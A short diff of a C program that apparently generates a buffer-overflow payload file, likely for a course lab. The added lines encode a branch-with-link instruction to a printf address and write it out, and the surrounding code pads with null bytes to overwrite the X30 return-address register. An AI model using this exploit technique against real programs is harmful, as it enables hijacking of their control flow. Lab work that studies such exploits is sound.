@@ -44,6 +44,11 @@ int main(void)
    printf("%u", uiInstr);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
 
+   /* Writes the instruction b 0x400864 (call of printf) */
+   uiInstr = MiniAssembler_bl(0x400864, 0x420070);
+   printf("%u", uiInstr);
+   fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);
+
    /* Writes enough null bytes to the dataB file
       to overrun until X30 */
    for (i = 0; i<BUFSIZE-28; i++) {
